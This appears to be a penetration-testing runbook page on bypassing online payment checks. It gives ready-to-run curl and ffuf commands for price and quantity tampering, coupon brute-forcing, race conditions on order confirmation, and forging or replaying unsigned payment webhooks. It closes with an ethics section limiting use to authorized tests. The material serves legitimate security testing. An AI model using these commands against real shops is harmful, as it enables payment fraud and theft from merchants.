---
title: "Bypass Payment Process"
description: "Tampering prices and quantities, abusing coupons and races, forging webhooks, and exploiting sandbox-to-production confusion in authorized payment testing."
phase: Web
order: 14
tags:
  - payments
  - business-logic
  - race-condition
  - webhooks
tools:
  - curl
  - burp suite
  - jq
updated: 2026-10-01
---

A runbook for authorized payment-flow testing on **in-scope** targets. Goal: prove the server trusts client-controlled price, quantity, or payment status, using test items and your own account.

## 1. Capture the payment flow

Record every call from cart -> checkout -> confirmation with Burp, then replay from the CLI.

```bash
# Inspect the order payload the server accepts
curl -s -X POST https://target/api/cart \
  -H "Cookie: session=..." -H "Content-Type: application/json" \
  -d '{"item":"sku-1","qty":1,"price":19.99}' | jq .
```

## 2. Tamper with price and currency

```bash
# Lower price / change currency / swap decimal separator
curl -s -X POST https://target/api/checkout -H "Cookie: session=..." \
  -d 'item=sku-1&qty=1&price=0.01&currency=USD' | jq .
curl -s -X POST https://target/api/checkout -H "Cookie: session=..." \
  -d 'item=sku-1&qty=1&price=19,99&currency=IDR' | jq .
```

Test rounding gaps (`0.001`), negative values, and overflow. Confirm whether the server recalculates the total or trusts the value.

## 3. Abuse quantity and cart logic

- Negative quantity to create credit or push the total below zero.
- Fractional quantities where integers are expected.
- Add an expensive item, then swap it for a cheap one after pricing.
- Stack coupons, or apply one after the total is locked.

## 4. Coupon abuse

```bash
# Brute-force predictable codes
seq -w 0 999 | ffuf -u "https://target/api/coupon/FUZZ" \
  -H "Cookie: session=..." -mc 200 -fs 0 -w - -s

# Reuse a single-use coupon
curl -s -X POST https://target/api/apply -H "Cookie: session=..." -d 'code=SAVE10'
```

## 5. Race conditions

Fire identical requests in parallel to overspend a balance or reuse credit.

```bash
seq 20 | xargs -P20 -I{} curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST https://target/api/order/confirm -H "Cookie: session=..." -d "order=123"
```

Watch for double fulfillment, duplicate credits, or a balance that never decreases.

## 6. Webhook forgery and replay

```bash
# If unsigned, spoof a success event
curl -s -X POST https://target/webhooks/payment \
  -H "Content-Type: application/json" \
  -d '{"event":"payment.succeeded","order":123,"amount":19.99}'

# Replay a captured valid webhook
curl -s -X POST https://target/webhooks/payment -H "Content-Type: application/json" \
  --data @captured_webhook.json
```

Check whether the signature is verified, covers the body, and has a timestamp; look for missing idempotency keys.

## 7. Sandbox-to-production confusion

- Test sandbox keys or test cards against the production endpoint.
- Check if a sandbox callback can mark a live order paid.
- Look for client-trusted provider status the server never verifies.

## Full pipeline

```bash
# 1. Capture the order flow, then replay with tampered values
curl -s -X POST https://target/api/checkout -H "Cookie: session=..." \
  -d 'item=sku-1&qty=1&price=0.01&currency=USD' | jq .

# 2. Negative / fractional quantity
curl -s -X POST https://target/api/checkout -H "Cookie: session=..." -d 'item=sku-1&qty=-1' | jq .

# 3. Coupon brute force
seq -w 0 999 | ffuf -u "https://target/api/coupon/FUZZ" -H "Cookie: session=..." -mc 200 -fs 0 -w - -s

# 4. Race the confirmation endpoint
seq 20 | xargs -P20 -I{} curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST https://target/api/order/confirm -H "Cookie: session=..." -d "order=123"

# 5. Forge / replay the payment webhook
curl -s -X POST https://target/webhooks/payment -H "Content-Type: application/json" \
  -d '{"event":"payment.succeeded","order":123,"amount":19.99}'
```

## Ethics & legality

- Only test with your own accounts, test items, and explicit authorization.
- Never complete real financial transactions or retain goods/services you did not pay for.
- Document the manipulated request, response, and resulting state; report impact precisely.
